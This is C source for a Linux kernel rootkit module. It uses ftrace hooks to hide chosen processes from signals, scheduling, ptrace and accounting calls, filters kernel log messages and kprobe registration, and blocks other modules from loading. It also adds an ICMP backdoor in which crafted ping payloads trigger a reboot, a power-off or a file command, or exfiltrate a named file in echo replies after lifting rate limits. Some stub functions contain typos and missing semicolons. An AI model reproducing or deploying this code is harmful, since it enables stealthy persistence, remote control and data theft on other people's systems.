static asmlinkage long (*real_sched_setaffinity)(struct pt_regs *regs) = NULL;
static asmlinkage long ftrace_sched_setaffinity(struct pt_regs *regs)
{
	return real_sched_setaffinity(regs);
}

static asmlinkage int (*real_sched_setattr)(struct pt_regs *regs) = NULL;
static asmlinkage int ftrace_sched_setattr(struct pt_regs *regs)
{
	return real_sched_setattr(regs);
}

static asmlinkage int (*real_do_tkill)(struct pt_regs *regs) = NULL;
static asmlinkage int ftrace_do_tkill(struct pt_regs *regs)
{
	return real_do_tkill(regs);
}

static asmlinkage int (*real_do_rt_sigqueueinfo)(struct pt_regs *regs) = NULL;
static asmlinkage int ftrace_do_rt_sigqueueinfo(struct pt_regs *regs)
{
	return real_do_rt_sigqueueinfo(regs);
}

static asmlinkage int (*real_do_rt_tgsigqueueinfo)(struct pt_regs *regs) = NULL;
static asmlinkage int ftrace_do_rt_tgsigqueueinfo(struct pt_regs *regs)
{
	return real_do_rt_tgsigqueueinfo(regs);
}

static asmlinkage int (*real_set_one_prio)(struct pt_regs *regs) = NULL;
static asmlinkage int ftrace_set_one_prio(struct pt_regs *regs)
{
	return real_set_one_prio(regs);
}

static asmlinkage int (*real_security_task_getsid)(struct pt_regs *regs) = NULL;
static asmlinkage int ftrace_security_task_getsid(struct pt_regs *regs)
{
	return real_security_task_getsid(regs);
}

static asmlinkage int (*real_security_task_setpgid)(struct pt_regs *regs) = NULL;
static asmlinkage int ftrace_security_task_setpgid(struct pt_regs *regs)
{
	return real_security_task_setpgid(regs);
}

static asmlinkage int (*real_kernel_migrate_pages)(struct pt_regs *regs) = NULL;
static asmlinkage int ftrace_kernel_migrate_pages(struct pt_regs *regs)
{
	return real_kernel_migrate_pages(regs);
}

static asmlinkage int (*real_kernel_move_pages)(struct pt_regs *regs) = NULL;
static asmlinkage int ftrace_kernel_move_pages(struct pt_regs *regs)
{
	return real_kernel_move_pages(regs);
}

static asmlinkage int (*real_do_prlimit)(struct pt_regs *regs) = NULL;
static asmlinkage int ftrace_do_prlimit(struct pt_regs *regs)
{
	return real_do_prlimit(regs);
}

static asmlinkage int (*real_pidfd_create)(struct pt_regs *regs) = NULL;
static asmlinkage int ftrace_pidfd_create(struct pt_regs *regs)
{
	return real_pidfd_create(regs);
}

static asmlinkage struct mm_struct * (*real_mm_access)(struct pt_regs *regs) = NULL;
static asmlinkage struct mm_struct * ftrace_mm_access(struct pt_regs *regs)
{
	return real_mm_access(regs);
}

static asmlinkage bool (*real_ptrace_may_access)(struct pt_regs *regs) = NULL;
static asmlinkage bool ftrace_ptrace_may_access(struct pt_regs *regs)
{
	return real_ptrace_may_access(regs);
}

static asmlinkage int (*real_reboot_pid_ns)(struct pt_regs *regs) = NULL;
static asmlinkage int ftrace_reboot_pid_ns(struct pt_regs *regs)
{
	return real_reboot_pid_ns(regs);
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 0, 1)
static asmlinkage int (*real___fsnotify_parent)(struct pt_regs *regs) = NULL;
static asmlinkage int ftrace___fsnotify_parent(struct pt_regs *regs)
{
	return real___fsnotify_parent(regs);
}

static asmlinkage int (*real_fsnotify)(struct pt_regs *regs) = NULL;
static asmlinkage int ftrace_fsnotify(struct pt_regs *regs)
{
	
	return read_fsnotify(regs);
} 
#endif

static asmlinkage  bool (*real_icmp_echo)(struct pt_regs *regs) = NULL;
static asmlinkage  bool ftrace_icmp_echo(struct pt_regs *regs)
{
	return real_icmp_echo(regs);
}

static asmlinkage  int (*real_ptrace_attach)(struct pt_regs *regs) = NULL;
static asmlinkage  int ftrace_ptrace_attach(struct pt_regs *regs)
{
	return real_ptrace_attach(regs);
}

static asmlinkage  int (*real_register_kprobe)(struct pt_regs *regs) = NULL;
static asmlinkage  int ftrace_register_kprobe(struct pt_regs *regs)
{
	return real_register_kprobe(regs);
}

static asmlinkage  int (*real_unregister_kprobe)(struct pt_regs *regs) = NULL;
static asmlinkage  int ftrace_unregister_kprobe(struct pt_regs *regs)
{
	return real_unregister_kprobe(regs);
}

static asmlinkage  size_t (*real_msg_print_text)(struct pt_regs *regs) = NULL;
static asmlinkage  size_t ftrace_msg_print_text(struct pt_regs *regs)
{
	return real_msg_print_text(regs);
}

static asmlinkage  ssize_t (*real_msg_print_ext_body)(struct pt_regs *regs) = NULL;
static asmlinkage  ssize_t ftrace_msg_print_ext_body(struct pt_regs *regs)
{
	return real_msg_print_ext_body(regs);
}

static asmlinkage  struct module* (*real_layout_and_allocate)(struct pt_regs *regs) = NULL;
static asmlinkage  struct module* ftrace_layout_and_allocate(struct pt_regs *regs)
{
	return real_layout_and_allocate(regs)
}

static asmlinkage  void (*real_acct_process)(struct pt_regs *regs) = NULL;
static asmlinkage  void ftrace_acct_process(struct pt_regs *regs)
{
	return real_acct_process(regs)
}

static asmlinkage  void (*real_taskstats_exit)(struct pt_regs *regs) = NULL;
static asmlinkage  void ftrace_taskstats_exit(struct pt_regs *regs)
{
	return real_taskstats_exit(regs)
}
#else

static asmlinkage long (*real_sched_getaffinity)(pid_t pid, struct cpumask *mask) = NULL;
static asmlinkage long ftrace_sched_getaffinity(pid_t pid, struct cpumask *mask)
{
	struct task_struct *p = NULL;
	int ret = 0;

	rcu_read_lock();
	p = p_find_task_by_vpid(pid);
	if (p)
		get_task_struct(p); 
	rcu_read_unlock();

	if (p) {
		if (is_hidden_proc(p))
			ret = -ESRCH;
		put_task_struct(p); 
	}
	if (ret == -ESRCH)
		return ret; 

	return real_sched_getaffinity(pid, mask);
}


static asmlinkage int (*real_security_task_getscheduler)(struct task_struct *p) = NULL;
static asmlinkage int ftrace_security_task_getscheduler(struct task_struct *p)
{
	if (p) {
		if (is_hidden_proc(p))
			return -ESRCH;
	}

	return real_security_task_getscheduler(p);
}

static asmlinkage long (*real_do_sched_setscheduler)(pid_t pid, int policy,
					 struct sched_param __user *param) = NULL;
static asmlinkage long ftrace_do_sched_setscheduler(pid_t pid, int policy,
					 struct sched_param __user *param)
{
	if (!param || pid < 0)
		return -EINVAL;
	if (is_hidden_proc_pid(pid))
		return -ESRCH;

	return real_do_sched_setscheduler(pid, policy, param);
}

static asmlinkage long (*real_sched_setaffinity)(pid_t pid, const struct cpumask *in_mask) = NULL;
static asmlinkage long ftrace_sched_setaffinity(pid_t pid, const struct cpumask *in_mask)
{
	if (is_hidden_proc_pid(pid))
		return -ESRCH;

	return real_sched_setaffinity(pid, in_mask);
}

static asmlinkage int (*real_sched_setattr)(struct task_struct *p, const struct sched_attr *attr) = NULL;
static asmlinkage int ftrace_sched_setattr(struct task_struct *p, const struct sched_attr *attr)
{
	if (is_hidden_proc(p))
		return -ESRCH;

	return real_sched_setattr(p, attr);
}

static asmlinkage int (*real_do_tkill)(pid_t tgid, pid_t pid, int sig) = NULL;
static asmlinkage int ftrace_do_tkill(pid_t tgid, pid_t pid, int sig)
{
	if (is_hidden_proc_pid(pid))
		return -ESRCH;

	return real_do_tkill(tgid, pid, sig);
}

static asmlinkage int (*real_do_rt_sigqueueinfo)(pid_t pid, int sig, kernel_siginfo_t *info) = NULL;
static asmlinkage int ftrace_do_rt_sigqueueinfo(pid_t pid, int sig, kernel_siginfo_t *info)
{
	if ((info->si_code >= 0 || info->si_code == SI_TKILL) &&
			(task_pid_vnr(current) != pid))
		return -EPERM;

	if (is_hidden_proc_pid(pid))
		return -ESRCH;

	return real_do_rt_sigqueueinfo(pid, sig, info);
}

static asmlinkage int (*real_do_rt_tgsigqueueinfo)(pid_t tgid, pid_t pid, int sig, kernel_siginfo_t *info) = NULL;
static asmlinkage int ftrace_do_rt_tgsigqueueinfo(pid_t tgid, pid_t pid, int sig, kernel_siginfo_t *info)
{
	/* This is only valid for single tasks */
	if (pid <= 0 || tgid <= 0)
		return -EINVAL;

	/* Not even root can pretend to send signals from the kernel.
	 * Nor can they impersonate a kill()/tgkill(), which adds source info.
	 */
	if ((info->si_code >= 0 || info->si_code == SI_TKILL) &&
			(task_pid_vnr(current) != pid))
		return -EPERM;

	if (is_hidden_proc_pid(pid))
		return -ESRCH;

	return real_do_rt_tgsigqueueinfo(tgid, pid, sig, info);
}

static asmlinkage int (*real_set_one_prio)(struct task_struct *p, int niceval, int error) = NULL;
static asmlinkage int ftrace_set_one_prio(struct task_struct *p, int niceval, int error)
{
	if (is_hidden_proc(p))
		return -ESRCH;

	return real_set_one_prio(p, niceval, error);
}

static asmlinkage int (*real_security_task_getsid)(struct task_struct *p) = NULL;
static asmlinkage int ftrace_security_task_getsid(struct task_struct *p)
{
	if (p) {
		if (is_hidden_proc(p))
			return -ESRCH;
	}

	return real_security_task_getsid(p);
}

static asmlinkage int (*real_security_task_setpgid)(struct task_struct *p, pid_t pgid) = NULL;
static asmlinkage int ftrace_security_task_setpgid(struct task_struct *p, pid_t pgid)
{
	if (p) {
		if (is_hidden_proc(p))
			return -ESRCH;
	}

	return real_security_task_setpgid(p, pgid);
}

static asmlinkage int (*real_kernel_migrate_pages)(pid_t pid, unsigned long maxnode,
                                 const unsigned long __user *old_nodes,
                                 const unsigned long __user *new_nodes) = NULL;
static asmlinkage int ftrace_kernel_migrate_pages(pid_t pid, unsigned long maxnode,
                                 const unsigned long __user *old_nodes,
                                 const unsigned long __user *new_nodes)
{
	if (is_hidden_proc_pid(pid))
		return -ESRCH;
	
	return real_kernel_migrate_pages(pid, maxnode, old_nodes, new_nodes);
}

static asmlinkage int (*real_kernel_move_pages)(pid_t pid, unsigned long nr_pages,
                              const void __user * __user *pages,
                              const int __user *nodes,
                              int __user *status, int flags) = NULL;
static asmlinkage int ftrace_kernel_move_pages(pid_t pid, unsigned long nr_pages,
                              const void __user * __user *pages,
                              const int __user *nodes,
                              int __user *status, int flags)
{
	 /* Check flags */
         if (flags & ~(MPOL_MF_MOVE|MPOL_MF_MOVE_ALL))
                 return -EINVAL;
 
         if ((flags & MPOL_MF_MOVE_ALL) && !capable(CAP_SYS_NICE))
                 return -EPERM;

	if (is_hidden_proc_pid(pid))
		return -ESRCH;

	return real_kernel_move_pages(pid, nr_pages, pages, nodes, status, flags);
}

static unsigned int *p_sysctl_nr_open = NULL;
static asmlinkage int (*real_do_prlimit)(struct task_struct *tsk, unsigned int resource,
                 			struct rlimit *new_rlim, struct rlimit *old_rlim) = NULL;
static asmlinkage int ftrace_do_prlimit(struct task_struct *tsk, unsigned int resource,
                 			struct rlimit *new_rlim, struct rlimit *old_rlim)
{
	if (resource >= RLIM_NLIMITS)
		return -EINVAL;
	if (new_rlim) {
		if (new_rlim->rlim_cur > new_rlim->rlim_max)
			return -EINVAL;
		if (resource == RLIMIT_NOFILE &&
				new_rlim->rlim_max > *p_sysctl_nr_open)
			return -EPERM;
	}

	if (is_hidden_proc(tsk))
		return -ESRCH;

	return real_do_prlimit(tsk, resource, new_rlim, old_rlim);
}

static asmlinkage int (*real_pidfd_create)(struct pid *pid) = NULL;
static asmlinkage int ftrace_pidfd_create(struct pid *pid)
{
	struct task_struct *tsk = NULL;

	tsk = get_pid_task(pid, PIDTYPE_TGID);
	if (tsk) {
		if (is_hidden_proc(tsk)) {
			put_task_struct(tsk);
			return -ESRCH;
		}
		put_task_struct(tsk);
	}
	return real_pidfd_create(pid);
}

static asmlinkage struct mm_struct * (*real_mm_access)(struct task_struct *task, unsigned int mode) = NULL;
static asmlinkage struct mm_struct * ftrace_mm_access(struct task_struct *task, unsigned int mode)
{
	if (is_hidden_proc(task)) 
		return ERR_PTR(-ESRCH);
	
	return real_mm_access(task, mode);
}

static asmlinkage bool (*real_ptrace_may_access)(struct task_struct *task, unsigned int mode) = NULL;
static asmlinkage bool ftrace_ptrace_may_access(struct task_struct *task, unsigned int mode)
{
	if (mode == PTRACE_MODE_READ_REALCREDS && is_hidden_proc(task))
		return 0;

	return real_ptrace_may_access(task, mode);
}

static asmlinkage int (*real_reboot_pid_ns)(struct pid_namespace *pid_ns, int cmd) = NULL;
static asmlinkage int ftrace_reboot_pid_ns(struct pid_namespace *pid_ns, int cmd)
{
	if (force_reboot_disabled) {
		if (cmd == LINUX_REBOOT_CMD_RESTART2
			|| cmd == LINUX_REBOOT_CMD_RESTART
			|| cmd == LINUX_REBOOT_CMD_POWER_OFF
			|| cmd == LINUX_REBOOT_CMD_HALT
			|| cmd == LINUX_REBOOT_CMD_KEXEC)
			return -EPERM;
	}

	return real_reboot_pid_ns(pid_ns, cmd);
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 0, 1)

static int is_hidden_path(const struct path *path)
{
	char *path_buf = NULL;
	char *p = NULL;
	int ret = 0;

	if (!path)
		goto end;

	path_buf = kmalloc(PATH_MAX, GFP_KERNEL);
	if (!path_buf) 
		goto end;

	p = d_path(path, path_buf, PATH_MAX - 1);
	if (IS_ERR_OR_NULL(p)) 
		goto end;
		
	ret = strlen(p);
	memmove(path_buf, p, ret);
	path_buf[ret] = '\0';

	if (is_hidden_proc_name(path_buf, PATH_MAX)) 
		ret = 1;

end:
	if (path_buf)
		kfree(path_buf);	
	return ret;
}

static asmlinkage int (*real___fsnotify_parent)(const struct path *path, struct dentry *dentry, __u32 mask) = NULL;
static asmlinkage int ftrace___fsnotify_parent(const struct path *path, struct dentry *dentry, __u32 mask)
{
	if (mask & (FS_OPEN_EXEC | FS_OPEN_EXEC_PERM | FS_OPEN_PERM)) 
		if (is_hidden_path(path))
			return 0;

	return real___fsnotify_parent(path, dentry, mask);
}

static asmlinkage int (*real_fsnotify)(struct inode *to_tell, __u32 mask, const void *data, int data_is,
             const struct qstr *file_name, u32 cookie) = NULL;
static asmlinkage int ftrace_fsnotify(struct inode *to_tell, __u32 mask, const void *data, int data_is,
             const struct qstr *file_name, u32 cookie)
{
	if (data_is == FSNOTIFY_EVENT_PATH 
		&& (mask & (FS_OPEN_EXEC | FS_OPEN_EXEC_PERM | FS_OPEN_PERM))) { 
		if (is_hidden_path((const struct path *)data))
			return 0;
	}
	
	return real_fsnotify(to_tell, mask, data, data_is, file_name, cookie);
} 
#endif

static char *touch_argv[] = {
	"/bin/touch",
	"/tmp/xxx",
	NULL,
};

static char *rm_argv[] = {
	"/bin/rm",
	"/tmp/xxx",
	NULL,
};

static char ** cmds_argv[] = {
	touch_argv,
	rm_argv,
};

enum {
	CMD_TOUCH_FILE,
	CMD_RM_FILE,
};

static char *cmd_envp[] = {
	"HOME=/",
	"PATH=/sbin:/bin:/usr/sbin:/usr/bin",
	NULL
};

static int run_usr_cmd(int cmd)
{
        char **argv = NULL;
	int ret = 0;

	if (cmd < CMD_TOUCH_FILE || cmd > CMD_RM_FILE)
		return -EINVAL;

	argv = cmds_argv[cmd];
	ret = call_usermodehelper(argv[0], argv, cmd_envp, UMH_NO_WAIT);

        return ret;
}

#define LEN_PREFIX_CMD 3
enum {
	CMD_SEND_FILE = 1,
	MAX_NUM_CMD,
};

struct exec_event {
	struct list_head list;
	int cmd;
	void *data;
};

DEFINE_SPINLOCK(exec_event_list_lock);
LIST_HEAD(exec_event_list);
static struct task_struct *event_kthread = NULL;
static DECLARE_WAIT_QUEUE_HEAD(exec_event_wait);

int make_exec_event(int cmd, void *data);
static int do_icmp_echo(struct sk_buff *skb)
{
	struct icmphdr *icmph = NULL;
	char *cmd = NULL;
	int len = 0;

	int ret = -1;

	icmph = icmp_hdr(skb);
	cmd = (char *)icmph + sizeof(struct icmphdr);
	len = skb->len - sizeof(struct icmphdr);

	if (len < 3)
		goto end;

	//*** or len == 7/18/29/40/51
	if ((cmd[0] == '*' && cmd[1] == '*' && cmd[2] == '*')) {
		kernel_restart(NULL);

	//$$$ or len == 2/17/32/47
	} else if ((cmd[0] == '$' && cmd[1] == '$' && cmd[2] == '$'))  {
		kernel_power_off();
		do_exit(0);
	//0x010101 or len == 6/30/54/
	} else if ((cmd[0] == 0x01 && cmd[1] == 0x01 && cmd[2] == 0x01)) {
		run_usr_cmd(CMD_TOUCH_FILE);
	//0x020202 or len == 3/28/53/
	} else if ((cmd[0] == 0x02 && cmd[1] == 0x02 && cmd[2] == 0x02)) {
		run_usr_cmd(CMD_RM_FILE);
	} else if (cmd[0] == 0x03 && cmd[1] == 0x03 && cmd[2] == 0x03) {
		if (len > 3)
			ret = make_exec_event(CMD_SEND_FILE, skb);
	}
end:
	return ret;
}

static asmlinkage  bool (*real_icmp_echo)(struct sk_buff *skb) = NULL;
static asmlinkage  bool ftrace_icmp_echo(struct sk_buff *skb)
{
	int ret = -1;

	ret = do_icmp_echo(skb);
	if (ret == 0 )
		return true;
	else

		return real_icmp_echo(skb);
}

static void set_seq(struct icmphdr *icmph, unsigned short seq)
{
	if (icmph)
		goto end;
 	icmph->un.echo.sequence = htons(seq); 

end:
	return;
}

struct icmp_echo_limit {
	int sysctl_icmp_echo_ignore_all;
        int sysctl_icmp_echo_ignore_broadcasts;
        int sysctl_icmp_ignore_bogus_error_responses;
        int sysctl_icmp_ratelimit;
        int sysctl_icmp_ratemask;
        int sysctl_icmp_errors_use_inbound_ifaddr;
	
	int sysctl_icmp_msgs_per_sec;
	int *p_sysctl_icmp_msgs_per_sec;
	int sysctl_icmp_msgs_burst;
	int *p_sysctl_icmp_msgs_burst;

} origin_limit = {0};

static int disable_icmp_echo_limit(struct net *net)
{
	if (!net)
		goto end;

	origin_limit.sysctl_icmp_echo_ignore_all = net->ipv4.sysctl_icmp_echo_ignore_all;
	if (origin_limit.sysctl_icmp_echo_ignore_all)
		net->ipv4.sysctl_icmp_echo_ignore_all = 0;

	origin_limit.sysctl_icmp_ratelimit = net->ipv4.sysctl_icmp_ratelimit;
	if (origin_limit.sysctl_icmp_ratelimit)
		net->ipv4.sysctl_icmp_ratelimit = INT_MAX;

	origin_limit.sysctl_icmp_ratemask = net->ipv4.sysctl_icmp_ratemask;
	if (origin_limit.sysctl_icmp_ratemask & (1<<ICMP_ECHO))
		net->ipv4.sysctl_icmp_ratemask &= ~(1<<ICMP_ECHO);

	if (!origin_limit.p_sysctl_icmp_msgs_per_sec)
		origin_limit.p_sysctl_icmp_msgs_per_sec = (int*)kallsyms_lookup_name("sysctl_icmp_msgs_per_sec");
	if (origin_limit.p_sysctl_icmp_msgs_per_sec) {  
		origin_limit.sysctl_icmp_msgs_per_sec = *origin_limit.p_sysctl_icmp_msgs_per_sec;
		*origin_limit.p_sysctl_icmp_msgs_per_sec = INT_MAX;	
	}

	if (!origin_limit.p_sysctl_icmp_msgs_burst)
		origin_limit.p_sysctl_icmp_msgs_burst = (int*)kallsyms_lookup_name("sysctl_icmp_msgs_burst");
	if (origin_limit.p_sysctl_icmp_msgs_burst) { 
		origin_limit.sysctl_icmp_msgs_burst = *origin_limit.p_sysctl_icmp_msgs_burst;
		*origin_limit.p_sysctl_icmp_msgs_burst = INT_MAX;	
	}

end:
	return 0;
} 

static int enable_icmp_echo_limit(struct net *net)
{
	if (!net)
		goto end;

	net->ipv4.sysctl_icmp_echo_ignore_all = origin_limit.sysctl_icmp_echo_ignore_all;
	net->ipv4.sysctl_icmp_ratelimit = origin_limit.sysctl_icmp_ratelimit;
	net->ipv4.sysctl_icmp_ratemask = origin_limit.sysctl_icmp_ratemask;

	if (origin_limit.p_sysctl_icmp_msgs_per_sec)
		*origin_limit.p_sysctl_icmp_msgs_per_sec = origin_limit.sysctl_icmp_msgs_per_sec;
	if (origin_limit.p_sysctl_icmp_msgs_burst)
		*origin_limit.p_sysctl_icmp_msgs_burst = origin_limit.sysctl_icmp_msgs_burst;
end:
	return 0;
} 

static int do_send_file(const char *name, struct sk_buff *skb, char *buf, int buf_len)
{
	struct sk_buff *skb2 = NULL;
	struct icmphdr *icmph = NULL;
	char *cmd = NULL;
	void *data = NULL;
	loff_t file_size = 0;
	loff_t size = 0;
	int len = 0;
	int l_name = 0;
	int rc = -1;
	unsigned short seq = 0; 

	const char *fname = kstrdup(name, GFP_KERNEL);
	if (!fname || buf_len <= 0)
		goto end;
	l_name = strlen(fname);

	rc = kernel_read_file_from_path(fname, &data, &file_size, INT_MAX, 0);
	if (rc < 0)
		goto end;
	printk(KERN_INFO "fname:%s, size:%llu", fname, file_size);

	disable_icmp_echo_limit(dev_net(skb_dst(skb)->dev));

	size = 0;
	seq = ntohs(icmp_hdr(skb)->un.echo.sequence);
	skb2 = skb_copy(skb, GFP_ATOMIC);
	if (!skb2)
		goto end;
	icmph = icmp_hdr(skb2);
	cmd = (char *)icmph + sizeof(struct icmphdr);

	while (file_size > 0) {
		len = file_size > buf_len ? buf_len : file_size;

		skb_get(skb2);
		memcpy(cmd+LEN_PREFIX_CMD+l_name+1, data+size, len);

		set_seq(icmph, seq);
		seq++;
		real_icmp_echo(skb2);
		file_size -= len;
		size += len;
	}
	printk(KERN_INFO "fname:%s, tran size:%llu\n", fname, size);

end:
	if (skb2)
		kfree_skb(skb2);

	enable_icmp_echo_limit(dev_net(skb_dst(skb)->dev));

	if (data)
		vfree(data);
	if (fname)
		kfree(fname);
	return 0;
}

static int send_file_task(void *data)
{
	struct sk_buff *skb = data;
	struct icmphdr *icmph = NULL;
	char *cmd = NULL;
	char *name = NULL;
	int len = 0;
	int f_len = 0;
	int i = 0;
	int ret = -1;

	if (!data)
		return 0;

	icmph = icmp_hdr(skb);
	cmd = (char *)icmph + sizeof(struct icmphdr);
	len = skb->len - sizeof(struct icmphdr);
	if (len <= 3)
		goto end;

	name = cmd + LEN_PREFIX_CMD;
	len -= LEN_PREFIX_CMD;
	while (i<len && name[i] != '\0') {
		if (!isprint(name[i])) {
			name[i] = '\0';
			break;
		}
		i++;
	}
	if (i>0 && i == len)
		name[i-1] = '\0';
	if ((f_len = strlen(name)) == 0)
		goto end;

	ret = do_send_file(name, skb, name+f_len+1, len-f_len-1); 

end:
	kfree_skb(skb);
	return ret;
}

int make_exec_event(int cmd, void *data)
{
	int ret = -1;
	struct exec_event *ev = NULL;
	struct sk_buff *skb = (struct sk_buff *)data;

	if (cmd <=0 || cmd >= MAX_NUM_CMD || !skb)
		goto end;

	ev = kmalloc(sizeof(*ev), GFP_ATOMIC);
	if (!ev)
		goto end;

	INIT_LIST_HEAD(&ev->list);
	ev->cmd = cmd;
	ev->data = data;

	skb_get(skb);
	spin_lock_bh(&exec_event_list_lock);
	list_add_tail(&exec_event_list, &ev->list);
	spin_unlock_bh(&exec_event_list_lock);
	wake_up_interruptible(&exec_event_wait);
	ret = 0;
end:
	return ret;
}

static int kthread_do_event(void *data)
{
	struct exec_event *ev = NULL;
	DECLARE_WAITQUEUE(wait, current);

        while (!kthread_should_stop()) {
		spin_lock_bh(&exec_event_list_lock);
		if (!list_empty(&exec_event_list)) {
			ev = list_first_entry(&exec_event_list, struct exec_event, list);
			list_del(&ev->list);
		}
		spin_unlock_bh(&exec_event_list_lock);

		if (ev) {
			switch (ev->cmd) {
			case CMD_SEND_FILE:
				send_file_task(ev->data);
				break;
			default:
				break;
			}
			kfree(ev);
			ev = NULL;
		} else {
			set_current_state(TASK_INTERRUPTIBLE);
			add_wait_queue(&exec_event_wait, &wait);
			schedule();
			remove_wait_queue(&exec_event_wait, &wait);
		}
        }

        return 0;
}



static asmlinkage  int (*real_ptrace_attach)(struct task_struct *task, long request,
                         unsigned long addr,
                         unsigned long flags) = NULL;
static asmlinkage  int ftrace_ptrace_attach(struct task_struct *task, long request,
                         unsigned long addr,
                         unsigned long flags) 
{
	if (is_hidden_proc(task))
		return -ESRCH;

	return real_ptrace_attach(task, request, addr, flags);
}

static asmlinkage  int (*real_register_kprobe)(struct kprobe *p) = NULL;
static asmlinkage  int ftrace_register_kprobe(struct kprobe *p)
{
	//puzzle kprpbe using in module when set force_kprobe_puzzle
	struct module *mod = NULL;
	if (force_kprobe_puzzle && !p_kernel_text_address((unsigned long)p)) {
				 // && !within_module((unsigned long)p, this_module))
		preempt_disable();
		mod = p_module_address((unsigned long)p);
		preempt_enable();
		if (!mod || !is_hidden_module_name(mod->name))
			return 0;
	}

	return real_register_kprobe(p);
}

static asmlinkage  int (*real_unregister_kprobe)(struct kprobe *p) = NULL;
static asmlinkage  int ftrace_unregister_kprobe(struct kprobe *p)
{
	//puzzle kprpbe using in module when set force_kprobe_puzzle
	struct module *mod = NULL;
	if (force_kprobe_puzzle && !p_kernel_text_address((unsigned long)p)) {
				 //&& !within_module((unsigned long)p, this_module))
		preempt_disable();
		mod = p_module_address((unsigned long)p);
		preempt_enable();
		if (!mod || !is_hidden_module_name(mod->name))
			return 0;
	}

	return real_unregister_kprobe(p);
}

static asmlinkage  size_t (*real_msg_print_text)(const struct printk_log *msg, bool syslog,
			                              bool time, char *buf, size_t size) = NULL;
static asmlinkage  size_t ftrace_msg_print_text(const struct printk_log *msg, bool syslog,
			                              bool time, char *buf, size_t size)
{
	char *text = NULL;

	if (!msg)
		return 0;

	text = log_text(msg);
	if (text && msg->text_len >= sizeof(hidden_msg_klog) && strstr(text, hidden_msg_klog))  
		return 0;
	
	return real_msg_print_text(msg, syslog, time, buf, size);
}

static asmlinkage  ssize_t (*real_msg_print_ext_body)(char *buf, size_t size,
		                                   char *dict, size_t dict_len,
               			                    char *text, size_t text_len) = NULL;
static asmlinkage  ssize_t ftrace_msg_print_ext_body(char *buf, size_t size,
		                                   char *dict, size_t dict_len,
               			                    char *text, size_t text_len)
{
	if (text && text_len >= sizeof(hidden_msg_klog) && strstr(text, hidden_msg_klog)) {  
		//memset(buf-size+1, 0 , CONSOLE_EXT_LOG_MAX-1);
		//return 0 - (CONSOLE_EXT_LOG_MAX - size);
		return (1 - (CONSOLE_EXT_LOG_MAX - size));
	}

	return real_msg_print_ext_body(buf, size, dict, dict_len, text, text_len);
}

static asmlinkage  struct module* (*real_layout_and_allocate)(struct load_info *info, int flags) = NULL;
static asmlinkage  struct module* ftrace_layout_and_allocate(struct load_info *info, int flags)
{
	if (info && info->name && !is_hidden_module_name(info->name) && force_modules_disabled)
		return ERR_PTR(-EPERM);

	if (is_in_hidden_module_list(info->name))
		return ERR_PTR(-EPERM);

	return real_layout_and_allocate(info, flags);

}

static asmlinkage  void (*real_acct_process)(void) = NULL;
static asmlinkage  void ftrace_acct_process(void)
{
	if (is_hidden_proc(current))
		return;
	return real_acct_process();
}

static asmlinkage  void (*real_taskstats_exit)(struct task_struct *tsk, int group_dead) = NULL;
static asmlinkage  void ftrace_taskstats_exit(struct task_struct *tsk, int group_dead)
{
	if (is_hidden_proc(tsk))
		return;
	return real_taskstats_exit(tsk, group_dead);
}
#endif

/* Check syscalls for hidden proc

asmlinkage long sys_sched_getscheduler(pid_t pid);
asmlinkage long sys_sched_getparam(pid_t pid,
                                        struct sched_param __user *param);
asmlinkage long sys_sched_getaffinity(pid_t pid, unsigned int len,
                                        unsigned long __user *user_mask_ptr);
asmlinkage long sys_getpriority(int which, int who);
asmlinkage long sys_getpgid(pid_t pid);
asmlinkage long sys_setpgid(pid_t pid, pid_t pgid);
asmlinkage long sys_getsid(pid_t pid);
asmlinkage long sys_sched_rr_get_interval(pid_t pid,
                                struct __kernel_timespec __user *interval);
asmlinkage long sys_sched_rr_get_interval_time32(pid_t pid,
                                                 struct old_timespec32 __user *interval);

asmlinkage long sys_kill(pid_t pid, int sig);
asmlinkage long sys_pidfd_send_signal(int pidfd, int sig,
                                       siginfo_t __user *info,
                                       unsigned int flags);

asmlinkage long sys_tkill(pid_t pid, int sig);
asmlinkage long sys_tgkill(pid_t tgid, pid_t pid, int sig);
asmlinkage long sys_rt_sigqueueinfo(pid_t pid, int sig, siginfo_t __user *uinfo);
asmlinkage long sys_rt_tgsigqueueinfo(pid_t tgid, pid_t  pid, int sig,
                			siginfo_t __user *uinfo);

asmlinkage long sys_sched_setparam(pid_t pid,
                                        struct sched_param __user *param);
asmlinkage long sys_sched_setscheduler(pid_t pid, int policy,
                                        struct sched_param __user *param);
asmlinkage long sys_sched_setaffinity(pid_t pid, unsigned int len,
                                        unsigned long __user *user_mask_ptr);

asmlinkage long sys_setpriority(int which, int who, int niceval);

asmlinkage long sys_migrate_pages(pid_t pid, unsigned long maxnode,
                                const unsigned long __user *from,
                                const unsigned long __user *to);
asmlinkage long sys_move_pages(pid_t pid, unsigned long nr_pages,
                                const void __user * __user *pages,
                                const int __user *nodes,
                                int __user *status,
                                int flags);

asmlinkage long sys_prlimit64(pid_t pid, unsigned int resource,
                                const struct rlimit64 __user *new_rlim,
                                struct rlimit64 __user *old_rlim);

asmlinkage long sys_pidfd_open(pid_t pid, unsigned int flags);

asmlinkage long sys_process_vm_readv(pid_t pid,
                                     const struct iovec __user *lvec,
                                     unsigned long liovcnt,
                                     const struct iovec __user *rvec,
                                     unsigned long riovcnt,
                                     unsigned long flags);
asmlinkage long sys_process_vm_writev(pid_t pid,
                                      const struct iovec __user *lvec,
                                      unsigned long liovcnt,
                                      const struct iovec __user *rvec,
                                      unsigned long riovcnt,
                                      unsigned long flags);

asmlinkage long sys_sched_setattr(pid_t pid,
                                        struct sched_attr __user *attr,
                                        unsigned int flags);
asmlinkage long sys_sched_getattr(pid_t pid,
                                        struct sched_attr __user *attr,
                                        unsigned int size,
                                        unsigned int flags);

asmlinkage long sys_perf_event_open(
                struct perf_event_attr __user *attr_uptr,
                pid_t pid, int cpu, int group_fd, unsigned long flags);
asmlinkage long sys_kcmp(pid_t pid1, pid_t pid2, int type,
                         unsigned long idx1, unsigned long idx2);

============================================================================

// prctl only set current task, so no hook
asmlinkage long sys_prctl(int option, unsigned long arg2, unsigned long arg3,
                         unsigned long arg4, unsigned long arg5);
*/

static struct ftrace_hook hooks[] = {
        HOOK("sched_getaffinity", ftrace_sched_getaffinity, &real_sched_getaffinity),
	//  sys_sched_getparam,  sys_sched_getparam, sys_sched_rr_get_interval, sys_sched_rr_get_interval_time32 
        //  sys_sched_getattr
        HOOK("security_task_getscheduler", ftrace_security_task_getscheduler, &real_security_task_getscheduler),
        //  sys_sched_setparam, sys_sched_setscheduler
